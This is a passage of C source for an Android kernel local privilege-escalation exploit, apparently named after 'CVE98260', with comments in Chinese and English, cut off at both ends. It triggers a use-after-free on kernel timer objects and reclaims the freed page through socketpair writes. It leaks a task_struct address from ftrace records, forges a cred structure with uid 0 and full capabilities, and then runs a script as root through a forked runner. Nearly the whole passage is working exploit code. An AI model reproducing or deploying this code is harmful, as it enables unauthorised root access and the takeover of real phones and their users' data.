				dprintf(STDOUT_FILENO, "[cred] plant does not fit off=%#x\n",
					cred_off);
				return -1;
			}
			if (!(cred_off >= blob + 32 || blob >= cred_off + CRED_PLANT_SIZE)) {
				dprintf(STDOUT_FILENO, "[cred] blob overlaps node\n");
				return -1;
			}
			*(uint64_t *)(pat + node_off)      = cred_kva;
			*(uint64_t *)(pat + node_off + 8)  = 0;
			*(uint64_t *)(pat + node_off + 16) = g_task + TASK_CRED;

			cred = (uint64_t *)(pat + cred_off);
			/*
			 * cred[0] = usage：必须非 0（防止提前被释放），且 <= 3，
			 *            这样 rb_parent(cred) = usage & ~3 == 0，rb_next 才能收尾。
			 * cred[1] = node 地址：rb_next(node) 沿 parent 爬到 cred 时，
			 *            靠 cred->rb_right == node 才继续往上走并返回 NULL。
			 */
			cred[0] = 2;
			cred[1] = node_kva;
			*(uint64_t *)((char *)cred + CRED_OFF_CAP_INH)  = FULLCAP;
			*(uint64_t *)((char *)cred + CRED_OFF_CAP_PERM) = FULLCAP;
			*(uint64_t *)((char *)cred + CRED_OFF_CAP_EFF)  = FULLCAP;
			*(uint64_t *)((char *)cred + CRED_OFF_CAP_BSET) = FULLCAP;
			*(uint64_t *)((char *)cred + CRED_OFF_CAP_AMB)  = FULLCAP;
			*(uint64_t *)((char *)cred + CRED_OFF_SELINUX)  = page + blob;
			*(uint64_t *)((char *)cred + CRED_OFF_ROOT_USER)= slide_addr(LINK_ROOT_USER);
			*(uint64_t *)((char *)cred + CRED_OFF_USER_NS)  = slide_addr(LINK_USER_NS);
			*(uint64_t *)((char *)cred + CRED_OFF_UCOUNTS)  = slide_addr(LINK_UCOUNTS);
			*(uint64_t *)((char *)cred + CRED_OFF_GROUPS)   = slide_addr(LINK_GROUPS);
			dprintf(STDOUT_FILENO,
				"[cred] node=%#" PRIx64 " cred=%#" PRIx64
				" task+cred=%#" PRIx64 " off=%#x\n",
				node_kva, cred_kva, g_task + TASK_CRED, node_off);
		} else {
			unsigned blob = node_off >= 0x40 ? 0 : 0x1f00;
			uint64_t *cred;
			if (node_off + CRED_PLANT_SIZE > 8192 || blob + 32 > 8192 ||
			    page + node_off != node_kva) {
				dprintf(STDOUT_FILENO, "[cred] plant does not fit off=%#x\n",
					node_off);
				return -1;
			}
			if (!(node_off >= blob + 32 || blob >= node_off + CRED_PLANT_SIZE)) {
				dprintf(STDOUT_FILENO, "[cred] blob overlaps node\n");
				return -1;
			}
			cred = (uint64_t *)(pat + node_off);
			if (CRED_UID_OFF >= 8) {
				/* 6.6/6.12/6.18: usage 占 8 字节，uid@8，直接写这三个槽位 */
				cred[0] = node_kva;             /* usage（非 0 防止提前释放） */
				cred[1] = 0;                    /* uid / gid */
				cred[2] = g_task + TASK_CRED;   /* suid / sgid（历史行为，保留） */
			} else {
				/*
				 * 5.15/6.1: usage 只有 4 字节、uid@4；写 8 字节会把 uid 打成
				 * node_kva 的高半部，16 处又是 sgid/euid —— 这两处都不能碰，
				 * 只写 usage，uid..fsgid 保持 memset 的 0。
				 */
				*(uint32_t *)(pat + node_off) = (uint32_t)node_kva;
			}
			*(uint64_t *)(pat + node_off + CRED_OFF_CAP_INH)  = FULLCAP;
			*(uint64_t *)(pat + node_off + CRED_OFF_CAP_PERM) = FULLCAP;
			*(uint64_t *)(pat + node_off + CRED_OFF_CAP_EFF)  = FULLCAP;
			*(uint64_t *)(pat + node_off + CRED_OFF_CAP_BSET) = FULLCAP;
			*(uint64_t *)(pat + node_off + CRED_OFF_CAP_AMB)  = FULLCAP;
			*(uint64_t *)(pat + node_off + CRED_OFF_SELINUX)  = page + blob;
			*(uint64_t *)(pat + node_off + CRED_OFF_ROOT_USER)= slide_addr(LINK_ROOT_USER);
			*(uint64_t *)(pat + node_off + CRED_OFF_USER_NS)  = slide_addr(LINK_USER_NS);
			*(uint64_t *)(pat + node_off + CRED_OFF_UCOUNTS)  = slide_addr(LINK_UCOUNTS);
			*(uint64_t *)(pat + node_off + CRED_OFF_GROUPS)   = slide_addr(LINK_GROUPS);
			dprintf(STDOUT_FILENO,
				"[cred] node=%#" PRIx64 " task+cred=%#" PRIx64 " off=%#x\n",
				node_kva, g_task + TASK_CRED, node_off);
		}
	} else {
		unsigned align = node_off % 24u;
		for (unsigned off = align; off + 24 <= 8192; off += 24) {
			uint64_t *node = (uint64_t *)(pat + off);
			node[0] = 0;
			node[1] = 0;
			node[2] = target;
		}
		dprintf(STDOUT_FILENO, "[stream_backfill] tile align=%u off=%#x\n", align, node_off);
	}
	return 0;
}

/** R1：从 reclaim_stream 抽出的「开 4 对已放大缓冲的 socketpair」。 */
static int open_stream_pairs(int big)
{
	g_nstream = 0;
	for (int i = 0; i < 4; i++) {
		if (socketpair(AF_UNIX, SOCK_STREAM, 0, g_stream[i]))
			break;
		setsockopt(g_stream[i][0], SOL_SOCKET, SO_SNDBUF, &big, sizeof(big));
		setsockopt(g_stream[i][1], SOL_SOCKET, SO_RCVBUF, &big, sizeof(big));
		fcntl(g_stream[i][0], F_SETFL, O_NONBLOCK);
		g_nstream++;
	}
	return g_nstream ? 0 : -1;
}

static int reclaim_stream(uint64_t victim, uint64_t target)
{
	uint64_t base = object_pfn(victim + KITIMER_NODE) & ~UINT64_C(1);
	unsigned node_off = (unsigned)((victim + KITIMER_NODE) & 0x1fff);
	unsigned char *pat;
	int big = 16 << 20, hit = 0, writes = 0, ncpu;
	struct timespec start, now;
	if (node_off + 24 > 8192)
		return -1;
	pat = mmap(NULL, 8192, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (pat == MAP_FAILED)
		return -1;
	memset(pat, 0, 8192);
	/* R1：模式构造已抽出为 build_stream_pattern */
	if (build_stream_pattern(pat, node_off, base, target, victim)) {
		munmap(pat, 8192);
		return -1;
	}
	/* R1：socketpair 建立已抽出为 open_stream_pairs */
	if (open_stream_pairs(big)) {
		munmap(pat, 8192);
		return -1;
	}
	ncpu = cpu_count();
	dprintf(STDOUT_FILENO, "[stream_backfill] pairs=%d node_base=%#" PRIx64 " off=%#x\n",
		g_nstream, base, node_off);
	if (write_file(TRACE "/buffer_size_kb", "65536\n")) {
		close_stream();
		return -1;
	}
	trigger_cmd("enable_event:kmem:mm_page_alloc\n");
	trigger_cmd("enable_event:kmem:mm_page_free\n");
	if (trace_off_on() || kick_rss()) {
		close_stream();
		return -1;
	}
	{
		struct timespec pause = { .tv_nsec = 200000000 };
		int freed = 0;
		int waitn = g_fast ? 12 : 40;
		for (int i = 0; i < waitn && !freed; i++) {
			nanosleep(&pause, NULL);
			freed = trace_seen("mm_page_free:", base);
		}
		dprintf(STDOUT_FILENO, "[stream_backfill] page_freed=%d\n", freed);
		crash_log("[crash] page_freed=%d base=%#" PRIx64 " off=%#x\n",
		     freed, base, node_off);
	}
	clock_gettime(CLOCK_MONOTONIC, &start);
	int rounds = g_fast ? 10 : 6;
	for (int round = 0; round < rounds && !hit; round++) {
		int sends = g_fast ? 200 : 80;
		for (int i = 0, sock = 0; i < sends && !hit; i++) {
			ssize_t n;
			pin_cpu(i % ncpu);
			n = write(g_stream[sock][0], pat, 8192);
			if (round == 0 && i == 0)
				crash_log("[crash] first write n=%zd\n", n);
			if (n == 8192)
				writes++;
			else if (++sock >= g_nstream)
				break;
		}
		crash_log("[crash] round=%d writes=%d\n", round, writes);
		hit = trace_seen("mm_page_alloc:", base);
		crash_log("[crash] round=%d hit=%d\n", round, hit);
		clock_gettime(CLOCK_MONOTONIC, &now);
		if (now.tv_sec - start.tv_sec > 8)
			break;
	}
	crash_log("[crash] backfill end writes=%d hit=%d\n", writes, hit);
	write_file(TRACE "/tracing_on", "0\n");
	if (hit)
		dprintf(STDOUT_FILENO, "[stream_backfill] hit pfn=%#" PRIx64 "\n", base);
	dprintf(STDOUT_FILENO, "[stream_backfill] writes=%d hit=%d\n", writes, hit);
	quiet_reclaim_trace();
	munmap(pat, 8192);
	if (!hit)
		close_stream();
	return hit ? 0 : -1;
}

static int one_uaf(uint64_t target)
{
	struct timespec c0, c1;
	long cms;
	clock_gettime(CLOCK_MONOTONIC, &c0);
	pid_t child;
	int code, status = 0, nptr, trace_rc;
	uint64_t victim;
	atomic_store_explicit(&g_go, 0, memory_order_relaxed);
	atomic_store_explicit(&g_stop, 0, memory_order_relaxed);
	atomic_store_explicit(&g_lockers, 0, memory_order_relaxed);
	atomic_store_explicit(&g_exec_tid, 0, memory_order_relaxed);
	atomic_store_explicit(&ipc->phase, 0, memory_order_relaxed);
	ipc->nhelpers = 0;
	child = fork();
	if (child < 0)
		return -1;
	if (child == 0) {
		if (g_wake[0] >= 0)
			close(g_wake[0]);
		if (g_wake[1] >= 0)
			close(g_wake[1]);
		if (g_report[0] >= 0)
			close(g_report[0]);
		if (g_report[1] >= 0)
			close(g_report[1]);
		child_race();
	}
	if (wait_phase(1)) {
		dprintf(STDOUT_FILENO, "[uaf] child never readied phase=%d\n", atomic_load_explicit(&ipc->phase, memory_order_acquire));
		kill(child, SIGKILL);
		stop_helpers();
		waitpid(child, NULL, 0);
		return -1;
	}
	trace_rc = write_file(TRACE "/buffer_size_kb", "16384\n");
	if (!trace_rc) {
		if (KO_TIMER_ALLOC_PROBE_OFF)
			trace_rc = kprobe_timer_probe_begin(&g_ksession);
		else
			trace_rc = arm_kmem_cache_alloc() || trace_off_on();
	}
	if (trace_rc) {
		kill(child, SIGKILL);
		stop_helpers();
		return -1;
	}
	atomic_store_explicit(&ipc->phase, 2, memory_order_release);
	if (wait_phase(3)) {
		dprintf(STDOUT_FILENO, "[uaf] timer was not created\n");
		write_file(TRACE "/tracing_on", "0\n");
		kill(child, SIGKILL);
		stop_helpers();
		waitpid(child, NULL, 0);
		return -1;
	}
	if (KO_TIMER_ALLOC_PROBE_OFF) {
		if (kprobe_timer_probe_collect(&g_ksession,
					       (long)atomic_load_explicit(&g_exec_tid, memory_order_acquire),
					       g_all,
					       (int)(sizeof(g_all) / sizeof(g_all[0])),
					       &nptr)) {
			kill(child, SIGKILL);
			stop_helpers();
			waitpid(child, NULL, 0);
			return -1;
		}
		g_all_n = nptr;
		victim = (nptr > 1024) ? g_all[1024] : 0;
	} else {
		write_file(TRACE "/tracing_on", "0\n");
		if (collect_nth(1024, &nptr, &victim)) {
			kill(child, SIGKILL);
			stop_helpers();
			waitpid(child, NULL, 0);
			return -1;
		}
	}
	if (nptr < 1500) {
		dprintf(STDOUT_FILENO, "[uaf] too few timers\n");
		kill(child, SIGKILL);
		stop_helpers();
		waitpid(child, NULL, 0);
		return -1;
	}
	/* kprobe 已在 collect 阶段拆除；tracepoint 路径要在这里显式关掉 */
	if (!KO_TIMER_ALLOC_PROBE_OFF)
		disarm_kmem_cache_alloc();
	atomic_store_explicit(&ipc->phase, 4, memory_order_release);
	if (g_plant_cred)
		/* 与 build_stream_pattern 的 cred 摆放保持一致 */
		g_cred_kva = victim + KITIMER_NODE +
			(g_cred_split_node ? CVE98260_CRED_NODE_DELTA : 0);
	if (reclaim_stream(victim, target)) {
		clock_gettime(CLOCK_MONOTONIC, &c1); cms = (c1.tv_sec - c0.tv_sec) * 1000 + (c1.tv_nsec - c0.tv_nsec) / 1000000;
		dprintf(STDOUT_FILENO, "[cycle] ms=%ld result=page_miss fast=%d\n", cms, g_fast);
		dprintf(STDOUT_FILENO, "[uaf] page miss, retry\n");
		crash_log("[crash] reclaim miss victim=%#" PRIx64 "\n", victim);
		stop_helpers();
		return -1;
	}
	crash_log("[crash] reclaim ok victim=%#" PRIx64 " cred=%#" PRIx64 "\n",
	     victim, g_cred_kva);
	code = wait_zombie(child, &status);
	dprintf(STDOUT_FILENO, "[uaf] child=%d code=%d status=%d\n",
		child, code, status);
	crash_log("[crash] zombie code=%d status=%d\n", code, status);
	if (waitpid(child, &status, 0) < 0)
		return -1;
	crash_log("[crash] reaped status=%d\n", status);
	clock_gettime(CLOCK_MONOTONIC, &c1); cms = (c1.tv_sec - c0.tv_sec) * 1000 + (c1.tv_nsec - c0.tv_nsec) / 1000000;
	dprintf(STDOUT_FILENO, "[cycle] ms=%ld result=ok fast=%d\n", cms, g_fast);
	log_sync();
	dprintf(STDOUT_FILENO, "[uaf] reaped status=%d\n", status);
	destroy_rings();
	stop_helpers();
	if (!WIFSIGNALED(status) || WTERMSIG(status) != SIGKILL) {
		dprintf(STDOUT_FILENO, "[uaf] reap was not SIGKILL\n");
		return -1;
	}
	return 0;
}

static volatile int g_daemon_mode = 0;
/* The one-shot script runner is forked exactly once, the first time the
 * escalation is confirmed. Guarding it matters: ask_child() re-enters this code
 * on every poll, and a second runner would run the root script twice. */
static int g_runner_forked = 0;
/* cred child -> runner handshake: one byte once the exploit has finished. */
static int g_script_trig[2] = { -1, -1 };

/*
 * Dedicated task that waits for the "exploit finished" byte, then execs
 * g_root_script_path as uid 0. It must be a separate process: the task carrying
 * the forged cred may only pause(), while fork() hands this child a real cred copy.
 */
static void root_script_runner(int trigger_fd)
{
	char go;
	sigset_t none;

	/* cred_child() blocks every signal and sets MCL_FUTURE; both would leak
	 * into the script through execve, so undo them here. */
	sigemptyset(&none);
	sigprocmask(SIG_SETMASK, &none, NULL);
	(void)munlockall();

	if (read(trigger_fd, &go, 1) != 1)
		_exit(0);
	close(trigger_fd);
	dprintf(STDOUT_FILENO, "[root] running %s (uid=%u euid=%u)\n", g_root_script_path, (unsigned)getuid(), (unsigned)geteuid());

	pid_t sh = fork();
	if (sh == 0) {
		execl("/system/bin/sh", "sh", g_root_script_path, NULL);
		dprintf(STDERR_FILENO, "[root] exec %s failed errno=%d\n", g_root_script_path, errno);
		_exit(127);
	}
	if (sh > 0) {
		int status = 0;
		while (waitpid(sh, &status, 0) < 0 && errno == EINTR);
		dprintf(STDOUT_FILENO, "[root] %s exit=%d\n", g_root_script_path, WIFEXITED(status) ? WEXITSTATUS(status) : -1);
	}
	_exit(0);
}

static void cred_child(void)
{
	sigset_t block;
	setpgid(0, 0);
	(void)prctl(PR_SET_NAME, "skroot_cve98260", 0, 0, 0);
	sigfillset(&block);
	sigprocmask(SIG_BLOCK, &block, NULL);
	if (g_wake[1] >= 0)
		close(g_wake[1]);
	if (g_report[0] >= 0)
		close(g_report[0]);
	g_wake[1] = g_report[0] = -1;
	dprintf(STDOUT_FILENO, "[child-cred] waiting pid=%d\n", getpid());
	/*
	 * Lock the whole address space. The forged cred lives in a reclaimed page
	 * that this process borrowed from the parent; without MCL_CURRENT the page
	 * can be reclaimed under us and the cred read back as the original uid
	 * (that is exactly the "[cred] installed" followed by "Uid: 2000" symptom).
	 * MCL_FUTURE keeps pages allocated later (fork, heap growth) locked too.
	 */
	if (mlockall(MCL_CURRENT | MCL_FUTURE))
		dprintf(STDOUT_FILENO, "[child-cred] warn: mlockall errno=%d\n", errno);
	for (;;) {
		unsigned uid, euid, gid, egid;
		unsigned char go;
		char msg[96];
		/* Blocking read, as in the reference implementation: the child stays
		 * asleep unless the parent actually talks to it, which keeps the page
		 * reclaim race undisturbed. A read failure means the parent closed the
		 * pipe, i.e. it retired after handing the pages over. */
		if (read(g_wake[0], &go, 1) != 1) {
			if (g_daemon_mode) {
				/*
				 * Detach and then do nothing at all -- this is the reference
				 * shape (PC uaf_plant.c:1471-1487).
				 *
				 * This task's ->cred points into the reclaimed page, and it is
				 * the only thing that must never stop running. It therefore
				 * must not execute anything else either: every syscall, fork or
				 * page fault it performs is one more chance for the kernel to
				 * touch a page that has since been reused. The script runner
				 * runs in its own process (forked below), so after this point
				 * the only thing left here is pause().
				 */
				dprintf(STDOUT_FILENO,
					"[child-cred] daemon mode: holding pages\n");
				log_sync();
				setsid();
				close(STDIN_FILENO);
				close(STDOUT_FILENO);
				close(STDERR_FILENO);
				open("/dev/null", O_RDONLY);
				open("/dev/null", O_WRONLY);
				open("/dev/null", O_WRONLY);
				for (;;)
					pause();
			}
			continue;
		}
		if (go == 0xAA) {
			/* Daemon command: the exploit is done. Release the script runner,
			 * acknowledge, drop the pipes, and keep looping until the parent
			 * closes its ends. */
			dprintf(STDOUT_FILENO, "[child-cred] entering daemon mode\n");
			log_sync();
			const char *ack = "daemon\n";
			(void)write(g_report[1], ack, strlen(ack));
			if (g_script_trig[1] >= 0) {
				char go_script = 'R';
				(void)write(g_script_trig[1], &go_script, 1);
				close(g_script_trig[1]);
				g_script_trig[1] = -1;
			}
			close(g_wake[0]);
			close(g_report[1]);
			g_daemon_mode = 1;
			continue;
		}
		uid = getuid();
		euid = geteuid();
		gid = getgid();
		egid = getegid();
		snprintf(msg, sizeof(msg), "uid=%u euid=%u gid=%u egid=%u\n",
			 uid, euid, gid, egid);
		if (write(g_report[1], msg, strlen(msg)) < 0)
			dprintf(STDOUT_FILENO, "[child-cred] answer errno=%d\n", errno);
		dprintf(STDOUT_FILENO, "[child-cred] %s", msg);
		/*
		 * Root confirmed: fork the one-shot script runner (PC uaf_plant.c:1516-1525).
		 *
		 * Always fork here, --daemon-exit or not. The daemon branch above only
		 * parks; the runner has to be a separate task so that the task carrying
		 * the forged cred never runs anything beyond pause(). This fork happens
		 * while the parent is still alive, so the runner inherits the terminal
		 * on fd 1 / fd 2 and the script output is visible.
		 *
		 * The forked runner gets a *copy* of the cred from prepare_creds(), i.e.
		 * a real cred_jar object, so it can exec the script safely.
		 */
		if (uid == 0 && euid == 0 && !g_runner_forked) {
			if (pipe(g_script_trig) == 0) {
				pid_t rd = fork();
				if (rd == 0) {
					close(g_script_trig[1]);
					setpgid(0, 0);
					root_script_runner(g_script_trig[0]);
					_exit(0);
				}
				close(g_script_trig[0]);
				g_script_trig[0] = -1;
				g_runner_forked = 1;
				dprintf(STDOUT_FILENO,
					"[child-cred] script runner forked pid=%d\n",
					(int)rd);
			} else {
				dprintf(STDOUT_FILENO,
					"[child-cred] script trigger pipe failed errno=%d\n",
					errno);
			}
		}
	}
}

static void log_proc_uid(pid_t pid)
{
	char path[64];
	char line[160];
	FILE *file;
	snprintf(path, sizeof(path), "/proc/%d/status", (int)pid);
	file = fopen(path, "r");
	if (!file)
		return;
	while (fgets(line, sizeof(line), file)) {
		if (!strncmp(line, "Uid:", 4) || !strncmp(line, "CapEff:", 7) ||
		    !strncmp(line, "State:", 6))
			dprintf(STDOUT_FILENO, "[cred] proc %s", line);
	}
	fclose(file);
}

static int ask_child(unsigned *uid, unsigned *euid)
{
	char buf[80];
	struct pollfd pfd;
	unsigned char go = 1;
	ssize_t n;
	if (kill(g_cred_child_pid, 0) != 0) {
		dprintf(STDOUT_FILENO, "[cred] child %d is dead errno=%d\n",
			g_cred_child_pid, errno);
		log_proc_uid(g_cred_child_pid);
		return -1;
	}
	fcntl(g_report[0], F_SETFL, O_NONBLOCK);
	while (read(g_report[0], buf, sizeof(buf)) > 0)
		;
	fcntl(g_report[0], F_SETFL, 0);
	if (write(g_wake[1], &go, 1) != 1) {
		dprintf(STDOUT_FILENO, "[cred] ask write errno=%d\n", errno);
		return -1;
	}
	pfd.fd = g_report[0];
	pfd.events = POLLIN;
	if (poll(&pfd, 1, 2000) <= 0) {
		dprintf(STDOUT_FILENO, "[cred] child %d stayed silent\n",
			g_cred_child_pid);
		log_proc_uid(g_cred_child_pid);
		return -1;
	}
	n = read(g_report[0], buf, sizeof(buf) - 1);
	if (n < 0) {
		dprintf(STDOUT_FILENO, "[cred] answer read errno=%d\n", errno);
		return -1;
	}
	buf[n > 0 ? n : 0] = 0;
	dprintf(STDOUT_FILENO, "[cred] answer %s", buf);
	if (sscanf(buf, "uid=%u euid=%u", uid, euid) == 2)
		return 0;
	return -1;
}

/*
 * Fixed-size frequency table used only for the failure diagnostics below.
 * Small on purpose: the point is to show the handful of dominant sizes /
 * call sites in the capture window, not to be a real histogram.
 */
struct freq {
	uint64_t key;
	uint32_t n;
};

static void freq_add(struct freq *table, int cap, int *used, uint64_t key)
{
	int i, min;
	for (i = 0; i < *used; i++) {
		if (table[i].key == key) {
			table[i].n++;
			return;
		}
	}
	if (*used < cap) {
		table[*used].key = key;
		table[*used].n = 1;
		(*used)++;
		return;
	}
	min = 0;
	for (i = 1; i < cap; i++)
		if (table[i].n < table[min].n)
			min = i;
	table[min].key = key;
	table[min].n = 1;
}

static void freq_dump(const char *tag, const struct freq *table, int used)
{
	int i;
	dprintf(STDOUT_FILENO, "[task] %s=", tag);
	if (!used)
		dprintf(STDOUT_FILENO, "none");
	for (i = 0; i < used; i++)
		dprintf(STDOUT_FILENO, "%s%#" PRIx64 ":%u", i ? " " : "",
			table[i].key, table[i].n);
	dprintf(STDOUT_FILENO, "\n");
}

/*
 * Locate the task_struct that fork() just allocated.
 *
 * Two keys, in this order:
 *   1. call_site == copy_process+0x140 (profile task_alloc_link). The kmem
 *      tracepoint records _RET_IP_, which for the fork path is the return
 *      address of the kmem_cache_alloc_node() call in copy_process -- a
 *      constant per kernel build and *independent of the slab object size*.
 *   2. bytes_req == sizeof(struct task_struct) -- the historical key, kept
 *      for profiles that predate task_alloc_link (blob < v3).
 *
 * Key 1 exists because on Xiaomi 6.6.118 the size key returned
 * "[task] hits=0 foreign=0": not "wrong pid", but no size match at all.
 * Matching on the call site removes the size assumption entirely.
 */
/* task_struct 缓存的实际尺寸不等于 BTF 里的 sizeof(struct task_struct)。
 *
 * kernel/fork.c:
 *   task_struct_cachep = kmem_cache_create_usercopy("task_struct",
 *           arch_task_struct_size, align,      // align = 0x40
 *           SLAB_PANIC|SLAB_ACCOUNT, useroffset, usersize, NULL);
 *
 * arch_task_struct_size 是 .data 里的运行时变量，本机（红米 K90 至尊
 * 6.6.118-g0908354dac1b / warsaw）地址 0xffffffc08211ae08，镜像初值 0。
 * 实测它只有两个写入点（反汇编 fork_init 段得到，均已核对）：
 *   0xffffffc081d004f4  mov w9,#0x12c0 ; str w9,[x8,#0xe08]      ; 默认值
 *   0xffffffc081d00468  add w8,w8,w9 (w9=0x12c0) ; str w8,[x8]   ; 厂商扩展
 * 后者先用 `cmp x0,#0x400 ; b.ls` 限定追加量上限；超限直接返回 -ENOENT，
 * 不落变量。⇒ object_size = 0x12c0 + extra，extra ∈ [0, 0x400]。
 *
 * 所以 BTF 的 4800 只是 object_size 的下界，slab 记录里的
 *   bytes_req   = s->object_size ∈ [4800, 4800+0x400]
 *   bytes_alloc = ALIGN(object_size, 0x40) 同样落在该窗口内。
 * 用 == TASK_STRUCT_SIZE 精确匹配，在带厂商扩展的内核上会 hits=0。
 *
 * 窗口是安全的：kmalloc 桶里 4096 与 8192 之间没有其它尺寸，fork 期间
 * 也不会有别的专用缓存的 object_size 落在 4800..5824。
 */
#define TASK_VENDOR_EXTRA_MAX 0x400U

static int task_size_in_window(uint64_t v)
{
	if (!TASK_STRUCT_SIZE)
		return 0;
	return v >= TASK_STRUCT_SIZE &&
	       v <= (uint64_t)TASK_STRUCT_SIZE + TASK_VENDOR_EXTRA_MAX;
}

static int leak_task(void)
{
	uint8_t *buf;
	int hits = 0, by_size = 0, by_site = 0, foreign = 0, other = 0;
	size_t scanned = 0;
	int ncpu = cpu_count();
	uint64_t want_site = TASK_ALLOC_LINK ? slide_addr(TASK_ALLOC_LINK) : 0;
	struct freq sizes[12];
	struct freq sites[8];
	int nsizes = 0, nsites = 0;
	uint64_t max_alloc = 0, max_site = 0;
	int have_site = 0;

	if (pipe(g_wake) || pipe(g_report))
		return -1;
	if (arm_kmem_cache_alloc() || trace_off_on())
		return -1;
	g_cred_child_pid = fork();
	if (g_cred_child_pid == 0)
		cred_child();
	if (g_cred_child_pid < 0)
		return -1;
	close(g_wake[0]);
	close(g_report[1]);
	g_wake[0] = g_report[1] = -1;
	write_file(TRACE "/tracing_on", "0\n");
	/* E3：复用全局 raw 缓冲（不再每次 malloc 4MB） */
	buf = raw_buf(4U << 20);
	if (!buf)
		return -1;
	if (ncpu < 1)
		ncpu = 1;
	for (int cpu = 0; cpu < ncpu; cpu++) {
		char path[128];
		size_t used = 0;
		int fd;
		snprintf(path, sizeof(path), TRACE "/per_cpu/cpu%d/trace_pipe_raw", cpu);
		fd = open(path, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
		if (fd < 0)
			continue;
		for (;;) {
			ssize_t n = read(fd, buf + used, (4U << 20) - used);
			if (n <= 0)
				break;
			used += (size_t)n;
			if (used + 65536 >= (4U << 20))
				break;
		}
		close(fd);
		scanned += used;
		for (size_t i = 8; i + 40 <= used; i++) {
			uint64_t site, ptr, req, alloc;
			uint32_t owner;
			int match, szok;
			/* raw record: [trace_entry @i-8][call_site i][ptr i+8]
			 * [bytes_req i+16][bytes_alloc i+24]; trace_entry.pid
			 * (the task doing the alloc) sits at i-4.
			 * 实测 trace_event_raw_event_kmem_cache_alloc:
			 *   rec+0x18 <- s->object_size (bytes_req)
			 *   rec+0x20 <- s->size        (bytes_alloc) */
			memcpy(&site, buf + i, 8);
			memcpy(&ptr, buf + i + 8, 8);
			memcpy(&req, buf + i + 16, 8);
			memcpy(&alloc, buf + i + 24, 8);
			if ((site >> 48) != 0xffff || (ptr >> 48) != 0xffff || (ptr & 7))
				continue;
			if (req < 8 || req > (1U << 22))
				continue;
			/* s->size 必然按 align(0x40) 对齐；object_size 不一定 */
			szok = task_size_in_window(req) ||
			       (task_size_in_window(alloc) && !(alloc & 63));
			memcpy(&owner, buf + i - 4, 4);
			if ((pid_t)owner != getpid()) {
				if (szok)
					foreign++;
				continue;
			}
			freq_add(sizes, 12, &nsizes, alloc);
			freq_add(sites, 8, &nsites, site);
			/* fork 过程中最大的那次 slab 分配就是 task_struct；
			 * 这个值能直接告诉我们本机 arch_task_struct_size 是多少。 */
			if (alloc >= 8 && alloc <= (1U << 20) && alloc > max_alloc) {
				max_alloc = alloc;
				max_site = site;
			}
			if (want_site && site == want_site) {
				match = 1;
				by_site++;
			} else if (szok) {
				match = 2;
				by_size++;
			} else {
				match = 0;
				other++;
			}
			if (!match)
				continue;
			/* call_site 命中是确定性的，优先级高于尺寸窗口；
			 * 一旦拿到 site 命中，就不再让尺寸兜底覆盖它。 */
			if (match == 1) {
				g_task = ptr;
				have_site = 1;
			} else if (!have_site) {
				g_task = ptr;
			}
			hits++;
			dprintf(STDOUT_FILENO,
				"[task] pid=%u by=%s site=%#" PRIx64 " ptr=%#" PRIx64
				" req=%" PRIu64 " alloc=%" PRIu64 "\n",
				owner, match == 1 ? "site" : "size", site, ptr,
				req, alloc);
		}
	}
	/* E3：缓冲由 raw_buf 持有，不在此释放 */
	disarm_kmem_cache_alloc();
	write_file(TRACE "/tracing_on", "0\n");
	dprintf(STDOUT_FILENO,
		"[task] hits=%d by_site=%d by_size=%d foreign=%d other=%d task=%#" PRIx64
		" raw=%zu cpus=%d size=%u..%u want_site=%#" PRIx64
		" max_alloc=%" PRIu64 "@%#" PRIx64 "\n",
		hits, by_site, by_size, foreign, other, g_task, scanned, ncpu,
		TASK_STRUCT_SIZE, TASK_STRUCT_SIZE + TASK_VENDOR_EXTRA_MAX, want_site,
		max_alloc, max_site);
	if (!hits) {
		/* One run must be enough to tell the three failure modes apart:
		 * no records at all -> event never enabled; records but none of
		 * our sizes -> size drift; the fork site present but not matched
		 * -> something even more specific. */
		freq_dump("sizes", sizes, nsizes);
		freq_dump("sites", sites, nsites);
	}
	return hits ? 0 : -1;
}

static void read_enforce(void)
{
	char buf[8] = { 0 };
	int fd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
	if (fd < 0) {
		dprintf(STDOUT_FILENO, "[SELinux] enforce read errno=%d\n", errno);
		return;
	}
	if (read(fd, buf, sizeof(buf) - 1) > 0)
		dprintf(STDOUT_FILENO, "[SELinux] enforce=%s", buf);
	close(fd);
}

static int enforce_is_permissive(void) {
	char c = 0;
	int fd = open("/sys/fs/selinux/enforce", O_RDONLY | O_CLOEXEC);
	if (fd < 0) return 0;
	if (read(fd, &c, 1) < 0) c = 0;
	close(fd);
	return c == '0';
}

static int g_fast;

/*
 * R1：从 uaf_plant_main 抽出的参数解析。
 *
 * 返回 daemon_exit（1 = 注入成功后主进程退出，页面交由 cred 子进程驻留）。
 * 未识别的参数静默忽略；常用组合是
 * --slide / --page-offset / --daemon-exit。
 */
static int parse_args(int argc, char **argv)
{
	int daemon_exit = 0;
	for (int i = 1; i < argc; i++) {
		if (!strcmp(argv[i], "--slide") && i + 1 < argc) {
			g_slide = strtoull(argv[++i], NULL, 0);
			g_slide_given = 1;
		}
		else if (!strcmp(argv[i], "--page-offset") && i + 1 < argc)
			g_page_offset = strtoull(argv[++i], NULL, 0);
		else if (!strcmp(argv[i], "--daemon-exit"))
			daemon_exit = 1;
	}
	return daemon_exit;
}

int uaf_plant_main(int argc, char **argv)
{
	struct sigaction action = { .sa_handler = on_alarm };
	
	// initialize offset table (from kernel_table)
	if (init_offsets() != 0) {
		fprintf(stderr, "[config] error: failed to init kernel offset table\n");
		return 1;
	}
	
	if (argc > 1 && !strcmp(argv[1], "--exec-ok"))
		_exit(0);
	/* cred/node 的摆放方式已由 init_offsets 按 profile 定好，DELTA 必须与之匹配 */
	if (cred_split_layout_ok())
		return 1;
	/* --daemon-exit: after the plant succeeds, hand the pages over to a detached
	 * daemon child and let this process return, so the caller is not
	 * blocked on a process that has to live forever.
	 * R1：解析逻辑已抽出为 parse_args。 */
	int daemon_exit = parse_args(argc, argv);
	if (!g_slide_given) {
		fprintf(stderr, "[error] --slide missing: pass the value printed by "
			"calibrate-a (e.g. --slide 0x1f200000)\n");
		return 1;
	}
	dprintf(STDOUT_FILENO, "[mode] daemon_exit=%d\n", daemon_exit);
	dprintf(STDOUT_FILENO, "[slide] %#" PRIx64 "\n", g_slide);
	g_fast = getenv("PLANT_FAST") != NULL;
	dprintf(STDOUT_FILENO, "[mode] fast=%d\n", g_fast);
	log_sync();
	print_cfg();
	if (argc > 1 && argv[1][0] != '-')
